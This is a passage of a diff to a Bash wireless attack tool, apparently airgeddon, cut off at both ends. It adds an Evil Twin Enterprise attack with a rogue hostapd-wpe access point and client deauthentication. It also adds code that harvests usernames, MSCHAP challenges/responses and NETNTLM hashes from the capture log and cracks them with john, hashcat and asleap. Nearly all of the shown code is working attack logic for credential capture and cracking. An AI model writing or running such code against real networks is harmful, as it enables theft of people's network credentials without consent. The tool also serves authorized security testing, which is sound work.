+		return
+	fi
+
+	set_minlength_and_maxlength "enterprise"
+
+	charset_option=0
+	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || (( charset_option < 1 || charset_option > 11 )); do
+		set_charset "jtr"
+	done
+
+	echo
+	language_strings "${language}" 209 "blue"
+	echo
+	language_strings "${language}" 190 "yellow"
+	language_strings "${language}" 115 "read"
+	exec_jtr_bruteforce_attack
+	manage_jtr_pot
+}
+
+#Validate and ask for the different parameters used in a hashcat dictionary based attack
+function hashcat_dictionary_attack_option() {
+
+	debug_print
+
+	manage_asking_for_captured_file "${1}" "hashcat"
+
+	if [ "${1}" = "personal" ]; then
+		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
+			return
+		fi
+
+		if ! convert_cap_to_hashcat_format; then
+			return
+		fi
+	else
+		if ! validate_enterprise_hashcat_file "${hashcatenterpriseenteredpath}"; then
+			return
+		fi
+	fi
+
+	manage_asking_for_dictionary_file
+
+	echo
+	language_strings "${language}" 190 "yellow"
+	language_strings "${language}" 115 "read"
+	exec_hashcat_dictionary_attack "${1}"
+	manage_hashcat_pot "${1}"
 }
 
 #Validate and ask for the different parameters used in a hashcat bruteforce based attack
@@ -5419,17 +6178,23 @@ function hashcat_bruteforce_attack_option() {
 
 	debug_print
 
-	manage_asking_for_captured_file
+	manage_asking_for_captured_file "${1}" "hashcat"
 
-	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
-		return
+	if [ "${1}" = "personal" ]; then
+		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
+			return
+		fi
+
+		if ! convert_cap_to_hashcat_format; then
+			return
+		fi
+	else
+		if ! validate_enterprise_hashcat_file "${hashcatenterpriseenteredpath}"; then
+			return
+		fi
 	fi
 
-	if ! convert_cap_to_hashcat_format; then
-		return
-	fi
-
-	set_minlength_and_maxlength
+	set_minlength_and_maxlength "${1}"
 
 	charset_option=0
 	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || (( charset_option < 1 || charset_option > 5 )); do
@@ -5441,8 +6206,8 @@ function hashcat_bruteforce_attack_option() {
 	echo
 	language_strings "${language}" 190 "yellow"
 	language_strings "${language}" 115 "read"
-	exec_hashcat_bruteforce_attack
-	manage_hashcat_pot
+	exec_hashcat_bruteforce_attack "${1}"
+	manage_hashcat_pot "${1}"
 }
 
 #Validate and ask for the different parameters used in a hashcat rule based attack
@@ -5450,14 +6215,20 @@ function hashcat_rulebased_attack_option() {
 
 	debug_print
 
-	manage_asking_for_captured_file
+	manage_asking_for_captured_file "${1}" "hashcat"
 
-	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
-		return
-	fi
+	if [ "${1}" = "personal" ]; then
+		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
+			return
+		fi
 
-	if ! convert_cap_to_hashcat_format; then
-		return
+		if ! convert_cap_to_hashcat_format; then
+			return
+		fi
+	else
+		if ! validate_enterprise_hashcat_file "${hashcatenterpriseenteredpath}"; then
+			return
+		fi
 	fi
 
 	manage_asking_for_dictionary_file
@@ -5466,8 +6237,8 @@ function hashcat_rulebased_attack_option() {
 	echo
 	language_strings "${language}" 190 "yellow"
 	language_strings "${language}" 115 "read"
-	exec_hashcat_rulebased_attack
-	manage_hashcat_pot
+	exec_hashcat_rulebased_attack "${1}"
+	manage_hashcat_pot "${1}"
 }
 
 #Check if the password was decrypted using hashcat and manage to save it on a file
@@ -5508,7 +6279,29 @@ function manage_hashcat_pot() {
 			if [ "${lastcharhashcat_potpath}" != "/" ]; then
 				hashcat_potpath="${hashcat_potpath}/"
 			fi
-			hashcatpot_filename="hashcat-${bssid}.txt"
+
+			local multiple_users=0
+			if [ "${1}" = "personal" ]; then
+				hashcatpot_filename="hashcat-${bssid}.txt"
+				[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
+			else
+				if [[ $(wc -l "${tmpdir}${hashcat_pot_tmp}" 2> /dev/null | awk '{print $1}') -gt 1 ]]; then
+					multiple_users=1
+					hashcatpot_filename="hashcat-enterprise_user-multiple_users.txt"
+					local enterprise_users=()
+					local hashcat_keys=()
+					readarray -t DECRYPTED_MULTIPLE_USER_PASS < <(uniq "${tmpdir}${hashcat_pot_tmp}" | sort 2> /dev/null)
+					for item in "${DECRYPTED_MULTIPLE_USER_PASS[@]}"; do
+						[[ "${item}" =~ ^([^:]+:?[^:]+) ]] && enterprise_users+=("${BASH_REMATCH[1]}")
+						[[ "${item}" =~ .+:(.+)$ ]] && hashcat_keys+=("${BASH_REMATCH[1]}")
+					done
+				else
+					local enterprise_user
+					[[ $(cat "${hashcatenterpriseenteredpath}") =~ ^([^:]+:?[^:]+) ]] && enterprise_user="${BASH_REMATCH[1]}"
+					hashcatpot_filename="hashcat-enterprise_user-${enterprise_user}.txt"
+					[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
+				fi
+			fi
 			hashcat_potpath="${hashcat_potpath}${hashcatpot_filename}"
 
 			validpath=1
@@ -5516,23 +6309,151 @@ function manage_hashcat_pot() {
 				read_path "hashcatpot"
 			done
 
-			[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
 			{
 			echo ""
 			date +%Y-%m-%d
 			echo "${hashcat_texts[${language},1]}"
 			echo ""
-			echo "BSSID: ${bssid}"
-			echo ""
-			echo "---------------"
-			echo ""
-			echo "${hashcat_key}"
 			} >> "${potenteredpath}"
+
+			if [ "${1}" = "personal" ]; then
+				{
+				echo "BSSID: ${bssid}"
+				} >> "${potenteredpath}"
+			else
+				if [ "${multiple_users}" -eq 1 ]; then
+					{
+					echo "${hashcat_texts[${language},3]}"
+					} >> "${potenteredpath}"
+				else
+					{
+					echo "${hashcat_texts[${language},2]}: ${enterprise_user}"
+					} >> "${potenteredpath}"
+				fi
+			fi
+
+			if [ "${multiple_users}" -eq 1 ]; then
+				{
+				echo ""
+				echo "---------------"
+				echo ""
+				} >> "${potenteredpath}"
+
+				for (( x=0; x<${#enterprise_users[@]}; x++ )); do
+					{
+					echo "${enterprise_users[${x}]} / ${hashcat_keys[${x}]}"
+					} >> "${potenteredpath}"
+				done
+			else
+				{
+				echo ""
+				echo "---------------"
+				echo ""
+				echo "${hashcat_key}"
+				} >> "${potenteredpath}"
+			fi
 
 			add_contributing_footer_to_file "${potenteredpath}"
 
 			echo
 			language_strings "${language}" 236 "blue"
+			language_strings "${language}" 115 "read"
+		fi
+	fi
+}
+
+#Check if the password was decrypted using john the ripper and manage to save it on a file
+function manage_jtr_pot() {
+
+	debug_print
+
+	jtr_pot=$(cat "${tmpdir}${jtr_pot_tmp}")
+
+	pass_decrypted_by_jtr=0
+
+	if [[ ${jtr_pot} =~ ^\$NETNTLM\$[^:]+:.+$ ]]; then
+		pass_decrypted_by_jtr=1
+	fi
+
+	if [ "${pass_decrypted_by_jtr}" -eq 1 ]; then
+
+		echo
+		language_strings "${language}" 234 "yellow"
+		ask_yesno 235 "yes"
+		if [ "${yesno}" = "y" ]; then
+			jtr_potpath="${default_save_path}"
+			lastcharjtr_potpath=${jtr_potpath: -1}
+			if [ "${lastcharjtr_potpath}" != "/" ]; then
+				jtr_potpath="${jtr_potpath}/"
+			fi
+
+			local multiple_users=0
+
+			if [[ $(wc -l "${tmpdir}${jtr_pot_tmp}" 2> /dev/null | awk '{print $1}') -gt 1 ]]; then
+				multiple_users=1
+				jtrpot_filename="jtr-enterprise_user-multiple_users.txt"
+				local enterprise_users=()
+				local jtr_keys=()
+				readarray -t DECRYPTED_MULTIPLE_PASS < <(uniq "${tmpdir}${jtr_pot_tmp}" | sort 2> /dev/null)
+				for item in "${DECRYPTED_MULTIPLE_PASS[@]}"; do
+					[[ "${item}" =~ ^\$NETNTLM\$[^:]+:(.+)$ ]] && jtr_keys+=("${BASH_REMATCH[1]}")
+					[[ $(grep -E "^${BASH_REMATCH[1]}" "${tmpdir}${jtr_output_file}") =~ ^"${BASH_REMATCH[1]}"[[:blank:]]+\((.+)\) ]] && enterprise_users+=("${BASH_REMATCH[1]}")
+				done
+			else
+				local enterprise_user
+				[[ $(cat "${jtrenterpriseenteredpath}") =~ ^([^:\$]+:?[^:\$]+) ]] && enterprise_user="${BASH_REMATCH[1]}"
+				jtrpot_filename="jtr-enterprise_user-${enterprise_user}.txt"
+				[[ "${jtr_pot}" =~ ^\$NETNTLM\$[^:]+:(.+)$ ]] && jtr_key="${BASH_REMATCH[1]}"
+			fi
+			jtr_potpath="${jtr_potpath}${jtrpot_filename}"
+
+			validpath=1
+			while [[ "${validpath}" != "0" ]]; do
+				read_path "jtrpot"
+			done
+
+			{
+			echo ""
+			date +%Y-%m-%d
+			echo "${jtr_texts[${language},1]}"
+			echo ""
+			} >> "${jtrpotenteredpath}"
+
+			if [ "${multiple_users}" -eq 1 ]; then
+				{
+				echo "${jtr_texts[${language},3]}"
+				} >> "${jtrpotenteredpath}"
+			else
+				{
+				echo "${jtr_texts[${language},2]}: ${enterprise_user}"
+				} >> "${jtrpotenteredpath}"
+			fi
+
+			if [ "${multiple_users}" -eq 1 ]; then
+				{
+				echo ""
+				echo "---------------"
+				echo ""
+				} >> "${jtrpotenteredpath}"
+
+				for (( x=0; x<${#enterprise_users[@]}; x++ )); do
+					{
+					echo "${enterprise_users[${x}]} / ${jtr_keys[${x}]}"
+					} >> "${jtrpotenteredpath}"
+				done
+			else
+				{
+				echo ""
+				echo "---------------"
+				echo ""
+				echo "${jtr_key}"
+				} >> "${jtrpotenteredpath}"
+			fi
+
+			add_contributing_footer_to_file "${jtrpotenteredpath}"
+
+			echo
+			language_strings "${language}" 547 "blue"
 			language_strings "${language}" 115 "read"
 		fi
 	fi
@@ -5585,6 +6506,99 @@ function manage_aircrack_pot() {
 			echo
 			language_strings "${language}" 440 "blue"
 			language_strings "${language}" 115 "read"
+		fi
+	fi
+}
+
+#Check if the password was decrypted using asleap against challenges and responses
+function manage_asleap_pot() {
+
+	debug_print
+
+	asleap_output=$(cat "${tmpdir}${asleap_pot_tmp}")
+
+	if [[ "${asleap_output}" =~ password:[[:blank:]]+(.*) ]]; then
+
+		local asleap_decrypted_password="${BASH_REMATCH[1]}"
+		local write_to_file=0
+
+		language_strings "${language}" 234 "yellow"
+
+		if [ "${1}" != "offline_menu" ]; then
+			echo
+			local write_to_file=1
+			asleap_attack_finished=1
+			path_to_asleap_trophy="${enterprise_completepath}enterprise_asleap_decrypted_${bssid}_password.txt"
+		else
+			ask_yesno 235 "yes"
+			if [ "${yesno}" = "y" ]; then
+				local write_to_file=1
+
+				asleap_potpath="${default_save_path}"
+				lastcharasleap_potpath=${asleap_potpath: -1}
+				if [ "${lastcharasleap_potpath}" != "/" ]; then
+					asleap_potpath="${asleap_potpath}/"
+				fi
+				asleappot_filename="asleap_decrypted_password.txt"
+				asleap_potpath="${asleap_potpath}${asleappot_filename}"
+
+				validpath=1
+				while [[ "${validpath}" != "0" ]]; do
+					read_path "asleappot"
+				done
+
+				path_to_asleap_trophy="${asleapenteredpath}"
+			fi
+		fi
+
+		if [ "${write_to_file}" = "1" ]; then
+			rm -rf "${path_to_asleap_trophy}" > /dev/null 2>&1
+
+			{
+			echo ""
+			date +%Y-%m-%d
+			echo "${asleap_texts[${language},1]}"
+			echo ""
+			} >> "${path_to_asleap_trophy}"
+
+			if [ "${1}" != "offline_menu" ]; then
+				{
+				echo "ESSID: ${essid}"
+				echo "BSSID: ${bssid}"
+				} >> "${path_to_asleap_trophy}"
+			fi
+
+			{
+			echo "${asleap_texts[${language},2]}: ${enterprise_asleap_challenge}"
+			echo "${asleap_texts[${language},3]}: ${enterprise_asleap_response}"
+			echo ""
+			echo "---------------"
+			echo ""
+			} >> "${path_to_asleap_trophy}"
+
+			if [ "${1}" != "offline_menu" ]; then
+				{
+				echo "${enterprise_username} / ${asleap_decrypted_password}"
+				} >> "${path_to_asleap_trophy}"
+			else
+				{
+				echo "${asleap_decrypted_password}"
+				} >> "${path_to_asleap_trophy}"
+			fi
+
+			add_contributing_footer_to_file "${path_to_asleap_trophy}"
+
+			language_strings "${language}" 539 "blue"
+			language_strings "${language}" 115 "read"
+		fi
+	else
+		if [ "${1}" != "offline_menu" ]; then
+			language_strings "${language}" 540 "red"
+
+			ask_yesno 541 "no"
+			if [ "${yesno}" = "n" ]; then
+				asleap_attack_finished=1
+			fi
 		fi
 	fi
 }
@@ -5649,7 +6663,11 @@ function manage_wps_log() {
 	if [ "${lastcharwps_potpath}" != "/" ]; then
 		wps_potpath="${wps_potpath}/"
 	fi
-	wpspot_filename="wps_captured_key-${wps_essid}.txt"
+	if [ -z "${wps_essid}" ]; then
+		wpspot_filename="wps_captured_key-${wps_bssid}.txt"
+	else
+		wpspot_filename="wps_captured_key-${wps_essid}.txt"
+	fi
 	wps_potpath="${wps_potpath}${wpspot_filename}"
 
 	validpath=1
@@ -5677,6 +6695,26 @@ function manage_wep_log() {
 	done
 }
 
+#Check if a hash or a password was captured using Evil Twin Enterprise attack and manage to save it on a directory
+function manage_enterprise_log() {
+
+	debug_print
+
+	enterprise_potpath=$(env | grep ^HOME | awk -F = '{print $2}')
+
+	lastcharenterprise_potpath=${enterprise_potpath: -1}
+	if [ "${lastcharenterprise_potpath}" != "/" ]; then
+		enterprise_potpath="${enterprise_potpath}/"
+	fi
+	enterprisepot_suggested_dirname="enterprise_captured-${essid}"
+	enterprise_potpath="${enterprise_potpath}${enterprisepot_suggested_dirname}/"
+
+	validpath=1
+	while [[ "${validpath}" != "0" ]]; do
+		read_path "enterprisepot"
+	done
+}
+
 #Check if the passwords were captured using the captive portal Evil Twin attack and manage to save them on a file
 function manage_captive_portal_log() {
 
@@ -5693,6 +6731,151 @@ function manage_captive_portal_log() {
 	while [[ "${validpath}" != "0" ]]; do
 		read_path "et_captive_portallog"
 	done
+}
+
+#Handle enterprise log captures
+function handle_enterprise_log() {
+
+	debug_print
+
+	if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
+
+		enterprise_attack_result_code=$(cat < "${tmpdir}${enterprisedir}${enterprise_successfile}" 2> /dev/null)
+		echo
+		if [ "${enterprise_attack_result_code}" -eq 0 ]; then
+			language_strings "${language}" 530 "yellow"
+			parse_from_enterprise "hashes"
+		elif [ "${enterprise_attack_result_code}" -eq 1 ]; then
+			language_strings "${language}" 531 "yellow"
+			parse_from_enterprise "passwords"
+		elif [ "${enterprise_attack_result_code}" -eq 2 ]; then
+			language_strings "${language}" 532 "yellow"
+			parse_from_enterprise "both"
+		fi
+
+		echo
+		language_strings "${language}" 533 "blue"
+		language_strings "${language}" 115 "read"
+	else
+		echo
+		language_strings "${language}" 529 "red"
+		language_strings "${language}" 115 "read"
+	fi
+}
+
+#Parse enterprise log to create trophy files
+function parse_from_enterprise() {
+
+	debug_print
+
+	local line_number
+	local username
+	local john_hashes=()
+	local hashcat_hashes=()
+	local passwords=()
+	local line_to_check
+	local text_to_check
+	unset enterprise_captured_challenges_responses
+	declare -gA enterprise_captured_challenges_responses
+
+	readarray -t CAPTURED_USERNAMES < <(grep -n -E "username:" "${tmpdir}${hostapd_wpe_log}" | sort -k 2,2 | uniq --skip-fields=1 2> /dev/null)
+	for item in "${CAPTURED_USERNAMES[@]}"; do
+		[[ "${item}" =~ ([0-9]+):.*username:[[:blank:]]+(.*) ]] && line_number="${BASH_REMATCH[1]}" && username="${BASH_REMATCH[2]}"
+		line_to_check=$((line_number + 1))
+		text_to_check=$(sed "${line_to_check}q;d" "${tmpdir}${hostapd_wpe_log}" 2> /dev/null)
+
+		if [[ "${text_to_check}" =~ challenge:[[:blank:]]+(.*) ]]; then
+			enterprise_captured_challenges_responses["${username}"]="${BASH_REMATCH[1]}"
+			line_to_check=$((line_number + 2))
+			text_to_check=$(sed "${line_to_check}q;d" "${tmpdir}${hostapd_wpe_log}" 2> /dev/null)
+			[[ "${text_to_check}" =~ response:[[:blank:]]+(.*) ]] && enterprise_captured_challenges_responses["${username}"]+=" / ${BASH_REMATCH[1]}"
+
+			line_to_check=$((line_number + 3))
+			text_to_check=$(sed "${line_to_check}q;d" "${tmpdir}${hostapd_wpe_log}" 2> /dev/null)
+			[[ "${text_to_check}" =~ jtr[[:blank:]]NETNTLM:[[:blank:]]+(.*) ]] && john_hashes+=("${BASH_REMATCH[1]}")
+
+			line_to_check=$((line_number + 4))
+			text_to_check=$(sed "${line_to_check}q;d" "${tmpdir}${hostapd_wpe_log}" 2> /dev/null)
+			[[ "${text_to_check}" =~ hashcat[[:blank:]]NETNTLM:[[:blank:]]+(.*) ]] && hashcat_hashes+=("${BASH_REMATCH[1]}")
+		fi
+
+		if [[ "${text_to_check}" =~ password:[[:blank:]]+(.*) ]]; then
+			passwords+=("${username} / ${BASH_REMATCH[1]}")
+		fi
+	done
+
+	prepare_enterprise_trophy_dir
+
+	case ${1} in
+		"hashes")
+			write_enterprise_hashes_file "hashcat" "${hashcat_hashes[@]}"
+			write_enterprise_hashes_file "john" "${john_hashes[@]}"
+		;;
+		"passwords")
+			write_enterprise_passwords_file "${passwords[@]}"
+		;;
+		"both")
+			write_enterprise_hashes_file "hashcat" "${hashcat_hashes[@]}"
+			write_enterprise_hashes_file "john" "${john_hashes[@]}"
+			write_enterprise_passwords_file "${passwords[@]}"
+		;;
+	esac
+
+	enterprise_username="${username}"
+}
+
+#Prepare dir for enterprise trophy files
+function prepare_enterprise_trophy_dir() {
+
+	debug_print
+
+	if [ ! -d "${enterprise_completepath}" ]; then
+		mkdir -p "${enterprise_completepath}" > /dev/null 2>&1
+	fi
+}
+
+#Write enterprise captured hashes to trophy file
+function write_enterprise_hashes_file() {
+
+	debug_print
+
+	local values=("${@:2}")
+	rm -rf "${enterprise_completepath}enterprise_captured_${1}_${bssid}_hashes.txt" > /dev/null 2>&1
+
+	for item in "${values[@]}"; do
+		{
+		echo "${item}"
+		} >> "${enterprise_completepath}enterprise_captured_${1}_${bssid}_hashes.txt"
+	done
+}
+
+#Write enterprise captured passwords to trophy file
+function write_enterprise_passwords_file() {
+
+	debug_print
+
+	local values=("${@:1}")
+	rm -rf "${enterprise_completepath}enterprise_captured_${bssid}_passwords.txt" > /dev/null 2>&1
+
+	{
+	echo ""
+	date +%Y-%m-%d
+	echo "${enterprise_texts[${language},11]}"
+	echo ""
+	echo "ESSID: ${essid}"
+	echo "BSSID: ${bssid}"
+	echo ""
+	echo "---------------"
+	echo ""
+	} >> "${enterprise_completepath}enterprise_captured_${bssid}_passwords.txt"
+
+	for item in "${values[@]}"; do
+		{
+		echo "${item}"
+		} >> "${enterprise_completepath}enterprise_captured_${bssid}_passwords.txt"
+	done
+
+	add_contributing_footer_to_file "${enterprise_completepath}enterprise_captured_${bssid}_passwords.txt"
 }
 
 #Captive portal language menu
@@ -5776,8 +6959,17 @@ function set_minlength() {
 
 	debug_print
 
+	local regexp
+	if [ "${1}" = "personal" ]; then
+		regexp="^[8-9]$|^[1-5][0-9]$|^6[0-3]$"
+		minlength_text=8
+	else
+		regexp="^[1-9]$|^[1-5][0-9]$|^6[0-3]$"
+		minlength_text=1
+	fi
+
 	minlength=0
-	while [[ ! ${minlength} =~ ^[8-9]$|^[1-5][0-9]$|^6[0-3]$ ]]; do
+	while [[ ! ${minlength} =~ ${regexp} ]]; do
 		echo
 		language_strings "${language}" 194 "green"
 		read -rp "> " minlength
@@ -5789,8 +6981,15 @@ function set_maxlength() {
 
 	debug_print
 
+	local regexp
+	if [ "${1}" = "personal" ]; then
+		regexp="^[8-9]$|^[1-5][0-9]$|^6[0-3]$"
+	else
+		regexp="^[1-9]$|^[1-5][0-9]$|^6[0-3]$"
+	fi
+
 	maxlength=0
-	while [[ ! ${maxlength} =~ ^[8-9]$|^[1-5][0-9]$|^6[0-3]$ ]]; do
+	while [[ ! ${maxlength} =~ ${regexp} ]]; do
 		echo
 		language_strings "${language}" 195 "green"
 		read -rp "> " maxlength
@@ -5802,10 +7001,10 @@ function set_minlength_and_maxlength() {
 
 	debug_print
 
-	set_minlength
+	set_minlength "${1}"
 	maxlength=0
 	while [[ ${maxlength} -lt ${minlength} ]]; do
-		set_maxlength
+		set_maxlength "${1}"
 	done
 }
 
@@ -5824,7 +7023,7 @@ function set_charset() {
 	language_strings "${language}" 200
 
 	case ${1} in
-		"aircrack")
+		"aircrack"|"jtr")
 			language_strings "${language}" 201
 			language_strings "${language}" 202
 			language_strings "${language}" 203
@@ -5910,7 +7109,7 @@ function set_show_charset() {
 	showcharset=""
 
 	case ${1} in
-		"aircrack")
+		"aircrack"|"jtr")
 			showcharset="${charset}"
 		;;
 		"hashcat")
@@ -5957,12 +7156,44 @@ function exec_aircrack_dictionary_attack() {
 	language_strings "${language}" 115 "read"
 }
 
+#Execute john the ripper dictionary attack
+function exec_jtr_dictionary_attack() {
+
+	debug_print
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1
+
+	jtr_cmd="john \"${jtrenterpriseenteredpath}\" --format=netntlm-naive --wordlist=\"${DICTIONARY}\" --pot=\"${tmpdir}${jtr_pot_tmp}\" --encoding=UTF-8 | tee \"${tmpdir}${jtr_output_file}\" ${colorize}"
+	eval "${jtr_cmd}"
+	language_strings "${language}" 115 "read"
+}
+
+#Execute john the ripper bruteforce attack
+function exec_jtr_bruteforce_attack() {
+
+	debug_print
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1
+
+	jtr_cmd="crunch \"${minlength}\" \"${maxlength}\" \"${charset}\" | john \"${jtrenterpriseenteredpath}\" --stdin --format=netntlm-naive --pot=\"${tmpdir}${jtr_pot_tmp}\" --encoding=UTF-8 | tee \"${tmpdir}${jtr_output_file}\" ${colorize}"
+	eval "${jtr_cmd}"
+	language_strings "${language}" 115 "read"
+}
+
 #Execute hashcat dictionary attack
 function exec_hashcat_dictionary_attack() {
 
 	debug_print
 
-	hashcat_cmd="hashcat -m 2500 -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+	if [ "${1}" = "personal" ]; then
+		hashcat_cmd="hashcat -m 2500 -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+	else
+		tmpfiles_toclean=1
+		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
+		hashcat_cmd="hashcat -m 5500 -a 0 \"${hashcatenterpriseenteredpath}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+	fi
 	eval "${hashcat_cmd}"
 	language_strings "${language}" 115 "read"
 }
@@ -5972,7 +7203,13 @@ function exec_hashcat_bruteforce_attack() {
 
 	debug_print
 
-	hashcat_cmd="hashcat -m 2500 -a 3 \"${tmpdir}${hashcat_tmp_file}\" \"${charset}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+	if [ "${1}" = "personal" ]; then
+		hashcat_cmd="hashcat -m 2500 -a 3 \"${tmpdir}${hashcat_tmp_file}\" \"${charset}\" --increment --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+	else
+		tmpfiles_toclean=1
+		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
+		hashcat_cmd="hashcat -m 5500 -a 3 \"${hashcatenterpriseenteredpath}\" \"${charset}\" --increment --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+	fi
 	eval "${hashcat_cmd}"
 	language_strings "${language}" 115 "read"
 }
@@ -5982,9 +7219,124 @@ function exec_hashcat_rulebased_attack() {
 
 	debug_print
 
-	hashcat_cmd="hashcat -m 2500 -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+	if [ "${1}" = "personal" ]; then
+		hashcat_cmd="hashcat -m 2500 -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+	else
+		tmpfiles_toclean=1
+		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
+		hashcat_cmd="hashcat -m 5500 -a 0 \"${hashcatenterpriseenteredpath}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+	fi
 	eval "${hashcat_cmd}"
 	language_strings "${language}" 115 "read"
+}
+
+#Execute Enterprise smooth attack
+function exec_enterprise_attack() {
+
+	debug_print
+
+	set_hostapd_wpe_config
+	launch_fake_ap
+	exec_et_deauth
+	set_enterprise_control_script
+	launch_enterprise_control_window
+	write_enterprise_processes
+
+	echo
+	language_strings "${language}" 524 "yellow"
+	language_strings "${language}" 115 "read"
+
+	kill_et_windows
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		recover_current_channel
+	fi
+	restore_et_interface
+	handle_enterprise_log
+	handle_asleap_attack
+	clean_tmpfiles
+}
+
+#Manage and handle asleap attack integrated on Evil Twin and Enterprise
+function handle_asleap_attack() {
+
+	debug_print
+
+	if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
+		ask_yesno 537 "no"
+		if [ "${yesno}" = "y" ]; then
+
+			asleap_attack_finished=0
+
+			if [ ${enterprise_mode} = "noisy" ]; then
+				if [ ${#enterprise_captured_challenges_responses[@]} -eq 1 ]; then
+					echo
+					language_strings "${language}" 542 "yellow"
+				else
+					select_captured_enterprise_user
+				fi
+			fi
+
+			echo
+			language_strings "${language}" 538 "blue"
+
+			while [[ "${asleap_attack_finished}" != "1" ]]; do
+				ask_dictionary
+				echo
+				exec_asleap_attack
+				echo
+				manage_asleap_pot
+			done
+		fi
+	fi
+}
+
+#Menu for captured enterprise user selection
+function select_captured_enterprise_user() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 47 "green"
+	print_simple_separator
+
+	local counter=0
+	local space="  "
+	declare -A temp_array_enterpise_users
+	for item in "${!enterprise_captured_challenges_responses[@]}"; do
+		if [ ${counter} -gt 9 ]; then
+			space=" "
+		fi
+		counter=$((counter + 1))
+		echo "${counter}.${space}${item}"
+		temp_array_enterpise_users[${counter}]="${item}"
+	done
+	print_simple_separator
+
+	option_enterprise_user_selected=""
+	while [[ -z "${option_enterprise_user_selected}" ]]; do
+		read -rp "> " option_enterprise_user_selected
+		if [[ ! "${option_enterprise_user_selected}" =~ ^[0-9]+$ ]] || [[ ${option_enterprise_user_selected} -lt 1 ]] || [[ ${option_enterprise_user_selected} -gt ${counter} ]]; then
+			option_enterprise_user_selected=""
+			echo
+			language_strings "${language}" 543 "red"
+		fi
+	done
+
+	enterprise_username="${temp_array_enterpise_users[${option_enterprise_user_selected}]}"
+}
+
+#Execute asleap attack
+function exec_asleap_attack() {
+
+	debug_print
+
+	rm -rf "${tmpdir}${asleap_pot_tmp}" > /dev/null 2>&1
+
+	if [ "${1}" != "offline_menu" ]; then
+		[[ "${enterprise_captured_challenges_responses[${enterprise_username}]}" =~ (([0-9a-zA-Z]{2}:?)+)[[:blank:]]/[[:blank:]](.*) ]] && enterprise_asleap_challenge="${BASH_REMATCH[1]}" && enterprise_asleap_response="${BASH_REMATCH[3]}"
+	fi
+	asleap_cmd="asleap -C \"${enterprise_asleap_challenge}\" -R \"${enterprise_asleap_response}\" -W \"${DICTIONARY}\" -v | tee \"${tmpdir}${asleap_pot_tmp}\" ${colorize}"
+	eval "${asleap_cmd}"
 }
 
 #Execute Evil Twin only Access Point attack
@@ -5998,8 +7350,8 @@ function exec_et_onlyap_attack() {
 	set_std_internet_routing_rules
 	launch_dhcp_server
 	exec_et_deauth
-	set_control_script
-	launch_control_window
+	set_et_control_script
+	launch_et_control_window
 
 	echo
 	language_strings "${language}" 298 "yellow"
@@ -6025,8 +7377,8 @@ function exec_et_sniffing_attack() {
 	launch_dhcp_server
 	exec_et_deauth
 	launch_ettercap_sniffing
-	set_control_script
-	launch_control_window
+	set_et_control_script
+	launch_et_control_window
 
 	echo
 	language_strings "${language}" 298 "yellow"
@@ -6056,8 +7408,8 @@ function exec_et_sniffing_sslstrip_attack() {
 	exec_et_deauth
 	launch_sslstrip
 	launch_ettercap_sniffing
-	set_control_script
-	launch_control_window
+	set_et_control_script
+	launch_et_control_window
 
 	echo
 	language_strings "${language}" 298 "yellow"
@@ -6095,8 +7447,8 @@ function exec_et_sniffing_sslstrip2_attack() {
 	fi
 	launch_beef
 	launch_bettercap_sniffing
-	set_control_script
-	launch_control_window
+	set_et_control_script
+	launch_et_control_window
 
 	echo
 	language_strings "${language}" 298 "yellow"
@@ -6125,8 +7477,8 @@ function exec_et_captive_portal_attack() {
 	set_std_internet_routing_rules
 	launch_dhcp_server
 	exec_et_deauth
